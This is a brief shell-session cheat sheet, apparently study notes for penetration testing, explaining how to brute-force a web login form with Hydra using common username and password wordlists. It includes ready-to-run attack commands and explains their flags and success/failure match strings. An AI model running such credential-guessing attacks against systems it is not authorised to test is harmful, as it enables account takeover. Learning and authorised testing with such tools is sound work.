
```shell-session
hydra [options] target http-post-form "path:params:condition_string"
```



```shell-session
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" -V

hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:S=Successful" -V

-L list of usernames
-P list of passwords
-f fast: stop after first valid login found
-s over ride the default port
username, password this names can be found via inspecting, network, or burp suite
F= it thinks that login failed if it finds Invalid credentials in the response
S= it thinks that login successed if it finds xyz in the page response
```
